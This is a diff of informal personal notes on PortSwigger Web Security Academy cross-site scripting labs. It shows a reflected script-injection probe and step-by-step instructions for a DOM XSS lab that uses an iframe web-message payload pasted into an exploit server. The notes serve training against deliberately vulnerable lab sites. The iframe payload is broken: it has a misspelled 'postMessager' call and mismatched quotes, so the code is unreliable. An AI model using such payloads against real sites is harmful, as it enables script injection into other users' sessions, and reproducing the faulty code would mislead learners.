@@ -87,17 +87,23 @@ https://0a9200a2034ea6c0809d6c42009c0068.web-security-academy.net/?search=hello
 ">hello
 3
 "><script>alert(om)</script>
-==========================
-============================
-===========================
-===========================
-
-
+===================================================================================
+===================================================================================
+===================================================================================
+===================================================================================
+DOM XSS Using Web Messages
+steps - -------
 https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
-https://0ac4005003d1b485803108eb004000b3.web-security-academy.net/
-https://exploit-0aa4004b039db46f80ae07a201df0043.exploit-server.net/
+Lab: DOM XSS using web messages -> ACCESS THE LAB-> click 
+on next page -> slect home -> right click -. inspect and view source page->and click -> go to exploit server ->  
+on next page -> go to - body - > Hello, world! - clear it 
+and write or paste there below text ---
 
-<iframe src="https://0ac4005003d1b485803108eb004000b3.web-security-academy.net/" onload="this.contentWindow.postMessager("<script>console.log(1)</script>','*')">
+<iframe src="https://0a9000e4038053fd80ea53e20071000f.web-security-academy.net/" onload="this.contentWindow.postMessager("<script>console.log(1)</script>','*')">
+note - every time you need to replace above written url with previous page url and other 
+text should remain same....
+
+click - view exploit 
 
 
 ===========================
